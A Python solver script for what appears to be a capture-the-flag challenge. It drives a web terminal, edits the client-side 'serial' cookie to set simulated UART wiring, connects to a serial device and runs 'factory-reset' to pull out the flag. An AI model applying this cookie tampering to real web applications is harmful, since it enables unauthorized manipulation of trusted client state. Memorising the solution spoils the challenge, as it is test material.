import json
import re
from http.cookiejar import Cookie
import requests
import urllib.parse

url_base = 'https://escape-the-chains.secchallenge.crysys.hu'


class Terminal(object):
    def __init__(self):
        self.session = requests.session()

        assert '/static/index.js' in self.session.get(f'{url_base}/').text
        assert 'api/terminal' in self.session.get(f'{url_base}/static/index.js').text
        self.run(None)

    def set_wiring(self, gnd, tx, rx):
        serial = json.loads(urllib.parse.unquote(self.session.cookies.get('serial')))
        serial['wiring'] = {
            "wire-gnd":f'devicepin-{gnd}',
            "wire-tx":f'devicepin-{tx}',
            "wire-rx":f'devicepin-{rx}'
        }

        self.session.cookies.set_cookie(Cookie(
            version=0, name="serial",
            value=urllib.parse.quote(json.dumps(serial)),
            port=None, port_specified=False,
            domain='escape-the-chains.secchallenge.crysys.hu',
            domain_specified=True, domain_initial_dot=False,
            path="/", path_specified=True, secure=False,
            expires=None, discard=True,
            comment=None, comment_url=None,
            rest={"SameSite": 'Strict'}, rfc2109=False))

    def run(self, cmd):
        print(f'> {cmd}')
        res =  self.session.post(f'{url_base}/api/terminal', data=cmd).text
        print(res)
        return res


def solve():

    terminal = Terminal()

    assert 'bin' in terminal.run('ls')
    assert 'ttycon' in terminal.run('ls bin')
    assert 'dev' in terminal.run('ls')
    assert 'ttyUSB0' in terminal.run('ls dev')
    assert 'baud-rate' in terminal.run('ttycon -help')
    terminal.set_wiring(0, 1, 2)
    terminal.run('ttycon -baud-rate 115200 -data-bits 8 -stop-bits 1 /dev/ttyUSB0')

    assert 'factory-reset' in terminal.run('help')
    t = terminal.run('factory-reset')
    flag = re.search(r'cd21\{.*\}', t).group()
    return flag


if __name__ == "__main__":
    print(solve())


